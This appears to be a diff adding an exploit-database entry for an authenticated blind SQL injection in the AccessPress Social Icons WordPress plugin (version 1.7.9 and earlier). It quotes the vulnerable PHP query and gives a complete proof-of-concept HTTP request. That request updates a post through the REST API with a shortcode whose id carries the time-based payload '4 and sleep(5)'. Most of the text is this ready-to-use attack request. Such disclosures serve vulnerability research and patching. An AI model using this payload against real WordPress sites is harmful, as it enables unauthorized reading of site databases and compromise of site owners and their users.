@@ -1,0 +1,42 @@
+# Exploit Title: Wordpress Theme Accesspress Social Icons 1.7.9 - SQL injection (Authenticated)
+# Exploit Author: SunCSR (Sun* Cyber Security Research) - Nguyen Khang
+# Google Dork: N/A
+# Date: 2020-08-24
+# Vendor Homepage: https://accesspressthemes.com
+# Software Link: https://wordpress.org/plugins/accesspress-social-icons/
+# Version: <= 1.7.9
+# Tested on: Ubuntu 18.04
+
+Description:
+A blind SQL injection vulnerability is present in Ajax load more.
+
+<?php
+$si_id = esc_attr($atts['id']);
+global $wpdb;
+$table_name = $table_name = $wpdb->prefix . "aps_social_icons";
+$icon_sets = $wpdb->get_results("SELECT * FROM $table_name where si_id =
+$si_id");
+
+POC:
+POST /wordpress/index.php?rest_route=%2Fwp%2Fv2%2Fposts%2F66&_locale=user
+HTTP/1.1
+Host: pwnme.me
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101
+Firefox/79.0
+Accept: application/json, */*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://pwnme.me/wordpress/wp-admin/post.php?post=66&action=edit
+X-WP-Nonce: 514cd2ab3f
+X-HTTP-Method-Override: PUT
+Content-Type: application/json
+Origin: http://pwnme.me
+Content-Length: 103
+Connection: close
+Cookie: wp-settings-time-2=1597912773;
+wordpress_test_cookie=WP+Cookie+check;
+wordpress_logged_in_01c9c451f599e513a69d1e6bb6f8e273=author%7C1598405206%7Cwp7Nu56SQz9nIWmkqZr94WFIpGZ6VfcTT5KaYPUULWe%7C3c4c3a80cbfd049b95b04a6104ded9b05f33f8a9900ccec818d5aa43c7102c79;
+wp-settings-time-3=1598234126
+
+{"id":66,"content":"<!-- wp:shortcode -->\n[aps-social id=\"4 and
+sleep(5)\"]\n<!-- /wp:shortcode -->"}
